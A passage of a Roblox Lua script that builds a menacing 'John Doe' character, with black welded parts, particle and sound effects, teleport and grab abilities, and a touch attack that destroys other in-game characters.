CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1.20000005, 0.600000024),CFrame = CFrame.new(2.63876629, 4.02682734, -4.32773018, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(-0.199987888, -2.39999342, 3.02791595e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 0.600000024),CFrame = CFrame.new(1.62134135, 7.81954479, -3.94021821, 0.964945078, -0.262291819, -0.00918725226, 0.251029015, 0.932593465, -0.259333432, 0.0765890032, 0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.964944899, 0.251028955, 0.0765889958, -0.262291819, 0.932593465, 0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.399995804, 1.5000124, -2.38418579e-007, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.600000024, 0.400000036),CFrame = CFrame.new(2.35483098, 5.18234444, -4.53787422, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.300010204, -1.29999256, 1.40666962e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 0.600000024),CFrame = CFrame.new(1.88730097, 6.99068737, -4.57445002, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.799996853, 0.50001812, 4.29153442e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.800000072, 0.600000024),CFrame = CFrame.new(2.37646794, 4.9594202, -4.07979012, -0.964945316, -0.262290984, 0.00918756705, -0.251028091, 0.932593942, 0.259333163, -0.0765890256, 0.247935995, -0.965744197),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945138, -0.251028031, -0.0765890107, -0.262290955, 0.932593882, 0.247935966, 0.0091875596, 0.259333193, -0.965744257),C1 = CFrame.new(-0.199994564, -1.39999104, 1.52587891e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
RightLeg = New("Model",chara,"RightLeg",{})
MainPart = New("Part",RightLeg,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.29641008, 1.31540966, 0.248092994, 0.00933599845, 0.00110999751, 0.999955773, -0.0030579993, 0.999994755, -0.00108149007, -0.99995178, -0.0030477671, 0.00933934376),CanCollide = false,BottomSurface = Enum.SurfaceType.Smooth,})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Right Leg"],C0 = CFrame.new(0, 0, 0, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),C1 = CFrame.new(2.98023224e-008, -8.58306885e-006, 2.38418579e-007, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(2.70045996, 1.61376095, -0.149078026, 0.999955833, 0.00111049914, -0.0093326522, -0.00108199986, 0.999994755, 0.00305823679, 0.00933599938, -0.00304800388, 0.999951839),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955893, -0.00108199986, 0.00933599938, 0.00111049926, 0.999994755, -0.00304800388, -0.0093326522, 0.00305823679, 0.99995178),C1 = CFrame.new(0.400011688, 0.300008655, 0.400000095, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.90071809, 1.81462395, -0.157150015, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(0.400002658, 0.50000751, -0.399999142, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000036, 0.200000003),CFrame = CFrame.new(1.896873, 1.71584904, 0.243133992, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(4.14252281e-006, 0.400008917, -0.399998784, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000072, 0.200000003),CFrame = CFrame.new(1.89314091, 1.71706903, 0.643112063, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(-0.399993181, 0.400005698, -0.399996519, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
EffCorruptedPart = New("Part",RightLeg,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1.20000005, 1),CFrame = CFrame.new(2.29597116, 0.915416002, 0.249298006, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(1.41263008e-005, -0.399995744, 5.00679016e-006, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.300596, 1.71419013, -0.153122023, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(0.400015235, 0.400005817, 7.39097595e-006, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(2.69322205, 1.81620288, 0.650299072, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(-0.400013447, 0.500005245, 0.400009155, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.69684124, 1.71498096, 0.250625998, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(-1.63316727e-005, 0.400005937, 0.400005102, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
ScatterEff(EffCorruptedPart)

sa = RightArm:GetChildren()
for i = 1, #sa do
ScatterEff(sa[i])
end

local eff1 = Instance.new("ParticleEmitter",EyeFire)
eff1.Size = NumberSequence.new(.1)
eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
eff1.LightEmission = 1
eff1.Lifetime = NumberRange.new(.5)
eff1.Speed = NumberRange.new(1)
eff1.EmissionDirection = "Front"
eff1.Rate = 100
eff1.Texture = "rbxassetid://347504241"
eff1.Acceleration = Vector3.new(0,10,0)
eff1.Color = ColorSequence.new(Color3.new(1,0,0))
local eff2 = Instance.new("ParticleEmitter",EyeFire)
eff2.Size = NumberSequence.new(.1)
eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
eff2.LightEmission = 1
eff2.Lifetime = NumberRange.new(.5)
eff2.Speed = NumberRange.new(1)
eff2.EmissionDirection = "Front"
eff2.Rate = 100
eff2.Texture = "rbxassetid://347504259"
eff2.Acceleration = Vector3.new(0,10,0)
eff2.Color = ColorSequence.new(Color3.new(1,0,0))
local eff3 = Instance.new("ParticleEmitter",EyeFire)
eff3.Size = NumberSequence.new(.1)
eff3.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
eff3.LightEmission = 1
eff3.Lifetime = NumberRange.new(.5)
eff3.Speed = NumberRange.new(1)
eff3.EmissionDirection = "Front"
eff3.Rate = 100
eff3.Texture = "rbxasset://textures/particles/fire_main.dds"
eff3.Acceleration = Vector3.new(0,10,0)
eff3.Color = ColorSequence.new(Color3.new(1,0,0))

--Sounds--
slashsnd = New("Sound",chara.Torso,"Slash",{SoundId = "rbxassetid://28144425",PlaybackSpeed = .7,Volume = 5})
hitsnd = New("Sound",chara.Torso,"Hit",{SoundId = "rbxassetid://429400881",PlaybackSpeed = .7,Volume = 5})
telesnd = New("Sound",chara.Torso,"Tele",{SoundId = "rbxassetid://2767090",PlaybackSpeed = .7,Volume = 5})
burnsnd = New("Sound",chara.Torso,"Burn",{SoundId = "rbxassetid://32791565",PlaybackSpeed = .7,Volume = 5})
music1 = New("Sound",chara.Torso,"Music1",{SoundId = "rbxassetid://151038517",PlaybackSpeed = .5,Volume = 10,Looped = true})
music2 = New("Sound",chara.Torso,"Music2",{SoundId = "rbxassetid://11984351",PlaybackSpeed = .2,Volume = 5,Looped = true})
deathmus = New("Sound",chara.Torso,"DeathMus",{SoundId = "rbxassetid://19094700",PlaybackSpeed = .5,Volume = 5,Looped = true})
deathex = New("Sound",chara.Torso,"DeathEx",{SoundId = "rbxassetid://11984351",PlaybackSpeed = 1,Volume = 5})
music1:Play()
music2:Play()

--Animations--
swinganim = chara.Humanoid:LoadAnimation(New("Animation",chara,"Swing",{AnimationId = "rbxassetid://186934658"}))

--Name Tag--
local naeeym = Instance.new("BillboardGui",chara)
naeeym.Size = UDim2.new(0,100,0,40)
naeeym.StudsOffset = Vector3.new(0,2,0)
naeeym.Adornee = chara.Head
local tecks = Instance.new("TextLabel",naeeym)
tecks.BackgroundTransparency = 1
tecks.BorderSizePixel = 0
tecks.Text = "John Doe"
tecks.Font = "Fantasy"
tecks.FontSize = "Size24"
tecks.TextStrokeTransparency = 0
tecks.TextStrokeColor3 = Color3.new(0,0,0)
tecks.TextColor3 = Color3.new(0,0,0)
tecks.Size = UDim2.new(1,0,0.5,0)

--Skybox--
skybox = Instance.new("Part",chara)
skybox.Size = Vector3.new(0,0,0)
skybox.Anchored = true
skybox.CanCollide = true
skyboxmesh = Instance.new("SpecialMesh",skybox)
skyboxmesh.MeshId = "http://www.roblox.com/asset/?id=1527559"
skyboxmesh.TextureId = "http://www.roblox.com/asset/?id=1529455"
skyboxmesh.VertexColor = Vector3.new(1,0,0)
skyboxmesh.Scale = Vector3.new(-3000,-1000,-3000)

--Soul Steal--
function SoulSteal(pos)
local soulst = coroutine.wrap(function()
local soul = Instance.new("Part",chara)
soul.Size = Vector3.new(0,0,0)
soul.CanCollide = false
soul.Anchored = false
soul.Position = pos
soul.CFrame = CFrame.new(pos.X,pos.Y,pos.Z)
soul.Transparency = 1
local ptc = Instance.new("ParticleEmitter",soul)
ptc.Texture = "http://www.roblox.com/asset/?id=413366101"
ptc.Size = NumberSequence.new(.5)
ptc.LockedToPart = true
ptc.Speed = NumberRange.new(0)
ptc.Lifetime = NumberRange.new(9999)
local bodpos = Instance.new("BodyPosition",soul)
bodpos.Position = pos
wait(2)
soul.Touched:connect(function(hit)
if hit.Parent == chara then
soul:Destroy()
end
end)
while soul do
wait(.1)
bodpos.Position = chara.Torso.Position
end
end)
soulst()
end

--Death of a Mortal--
function KillMortal(hitdude)
local torsy = nil
if hitdude:FindFirstChild("Torso")~=nil then
torsy = hitdude.Torso	
elseif hitdude:FindFirstChild("UpperTorso")~=nil then
torsy = hitdude.UpperTorso
end
local val = Instance.new("ObjectValue",hitdude)
val.Name = "HasBeenHit"
hitdude:BreakJoints()
hitdude.Humanoid:Destroy()
SoulSteal(torsy.Position)
local chi = hitdude:GetChildren()
for i = 1, #chi do
if chi[i].ClassName == "Part" or chi[i].ClassName == "MeshPart" then
local bodpos = Instance.new("BodyPosition",chi[i])
bodpos.Position = chi[i].Position + Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
ScatterEff(chi[i])
chi[i].BrickColor = BrickColor.new("Really black")
end
end
for i = 1, 4 do
for i = 1, #chi do
if chi[i].ClassName == "Part" or chi[i].ClassName == "MeshPart" then
chi[i].Transparency = chi[i].Transparency + .25
wait(.01)
end
end
end
for i = 1, #chi do
if chi[i].ClassName == "Part" or chi[i].ClassName == "MeshPart" then
chi[i]:Destroy()
end
end
end

--Arm Touch--
bladeactive = false
Hitbox.Touched:connect(function(hit)
if bladeactive == true then
if hit.Parent:FindFirstChild("Humanoid")~= nil and hit.Parent:FindFirstChild("HasBeenHit")== nil and hit.Parent ~= chara then
hitsnd:Play()
KillMortal(hit.Parent)
end
end
end)

--Teleport--
function Teleport(pos)
telesnd:Play()
local ch = chara:GetChildren()
for i = 1, #ch do
if ch[i].ClassName == "Part" and ch[i].Name ~= "HumanoidRootPart" then
local trace = Instance.new("Part",game.Workspace)
trace.Size = ch[i].Size
trace.Material = "Neon"
trace.BrickColor = BrickColor.new("Really black")
trace.Transparency = .3
trace.CanCollide = false
trace.Anchored = true
trace.CFrame = ch[i].CFrame
if ch[i].Name == "Head" then
mehs = Instance.new("CylinderMesh",trace)
mehs.Scale = Vector3.new(1.25,1.25,1.25)
end
tracedisappear = coroutine.wrap(function()
wait(1)
for i = 1, 7 do
wait(.1)
trace.Transparency = trace.Transparency + .1
end
trace:Destroy()
end)
tracedisappear()
end
end
chara.Torso.CFrame = CFrame.new(pos.X,pos.Y,pos.Z)
end

--Grab--
function Grab(mouse)
local hit = mouse.Target
if hit ~= nil then
if hit.Parent:FindFirstChild("Humanoid")~=nil then
local torsy = nil
if hit.Parent:FindFirstChild("Torso")~=nil then
torsy = hit.Parent.Torso
elseif hit.Parent:FindFirstChild("UpperTorso")~=nil then
torsy = hit.Parent.UpperTorso
end
local bodpos = Instance.new("BodyPosition",torsy)
bodpos.Position = torsy.Position
wait(1)
burnsnd:Play()
hit.Parent.Humanoid.MaxHealth = 100
bodpos.Position = bodpos.Position + Vector3.new(0,4,0)
for i = 1, 10 do
wait(.1)
BurningEff(torsy)
hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 10
end
KillMortal(hit.Parent)
end
else end
end

--Button1Down--
dell = false
function onButton1Down()
if dell == false then
dell = true
swinganim:Play()
bladeactive = true
slashsnd:Play()
wait(.7)
bladeactive = false
dell = false
swinganim:Stop()
end
end

--KeyDowns--
function onKeyDown(key)
if key == "z" then
Teleport(Mouse.Hit.p + Vector3.new(0,2,0))
elseif key == "x" then
Grab(Mouse)
end
end

--Mouse Functions--
Mouse = player:GetMouse()
if Mouse then
Mouse.Button1Down:connect(onButton1Down)
Mouse.KeyDown:connect(onKeyDown)
end

--Death--
chara.Humanoid.Died:connect(function()
local pat = Instance.new("Part",game.Workspace)
pat.Transparency = 1
pat.Anchored = true
pat.CFrame = chara.Torso.CFrame
naeeym.Parent = pat
naeeym.Adornee = pat
skybox.Parent = game.Workspace
tecks.Text = "BAD CHOICE"
tecks.FontSize = "Size48"
tecks.TextColor3 = Color3.new(1,0,0)
music1:Stop()
music2:Stop()
deathmus.Parent = game.Workspace
deathex.Parent = game.Workspace
deathmus:Play()
deathex:Play()
game.Lighting.OutdoorAmbient = Color3.new(0,0,0)
game.Lighting.TimeOfDay = "00:00:00"
game.Lighting.FogColor = Color3.new(0,0,0)
game.Lighting.FogEnd = 1000
local ex = Instance.new("Explosion",game.Workspace)
ex.Position = chara.Torso.Position
ex.Visible = false
ex.BlastRadius = 999999999999999999999999
ex.BlastPressure = 9999999999999999999999999
end)

--Loop Function--
while true do
wait(.01)
chance = math.random(0,100)
if chance < 10 then
sel = math.random(1,3)
if sel == 1 then
tecks.Text = "NOHOPE"
elseif sel == 2 then
tecks.Text = "GIVEUP"
elseif sel == 3 then
tecks.Text = "BURNINHELL"
end
else tecks.Text = "John Doe"
end
if chara.Humanoid.Health > 0 then
chara.Humanoid.MaxHealth = math.huge
chara.Humanoid.Health = math.huge
game.Lighting.OutdoorAmbient = Color3.new(1,0,0)
game.Lighting.Ambient = Color3.new(1,0,0)
chara["Left Arm"].BrickColor = BrickColor.new("Cool yellow")
chara["Right Arm"].BrickColor = BrickColor.new("Cool yellow")
chara["Left Leg"].BrickColor = BrickColor.new("Medium blue")
chara["Right Leg"].BrickColor = BrickColor.new("Medium blue")
chara.Torso.BrickColor = BrickColor.new("Bright yellow")
chara["Left Arm"].Anchored = false
chara["Right Arm"].Anchored = false
chara["Left Leg"].Anchored = false
chara["Right Leg"].Anchored = false
chara.Torso.Anchored = false
ch = chara:GetChildren()
for i = 1, #ch do
if ch[i].ClassName == "Accessory" or ch[i].ClassName == "Hat" then
ch[i]:Destroy()
end
end
tools = player.Backpack:GetChildren()
for i = 1, #tools do
if tools[i].ClassName == "HopperBin" then
tools[i]:Destroy()
end
end
skybox.CFrame = skybox.CFrame * CFrame.fromEulerAnglesXYZ(0,math.rad(1),0)
tecks.Position = UDim2.new(0,math.random(-3,3),0,math.random(-3,3))
local jtrace = Instance.new("Part",game.Workspace)
jtrace.Name = "JDTrace"
